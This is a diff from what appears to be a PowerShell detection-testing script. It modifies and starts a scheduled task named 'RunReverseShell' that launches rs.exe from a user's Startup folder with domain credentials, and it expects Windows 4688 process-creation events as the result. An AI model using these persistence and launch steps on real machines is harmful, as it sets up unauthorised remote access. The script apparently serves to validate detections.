@@ -1346,9 +1346,10 @@ schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roam
 
 `$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
 `$task = Get-ScheduledTask -TaskName "RunReverseShell"
-`$newAction = New-ScheduledTaskAction -Execute `$Path -Argument ""
-Register-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -Principal `$task.Principal
+`$newAction = New-ScheduledTaskAction -Execute `$Path 
+Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password
 
+Start-ScheduledTask -TaskName "RunReverseShell"
 schtasks /run /tn "RunReverseShell"
 
 Write-Output "`n[+] There should be 4688 events for rs.exe."
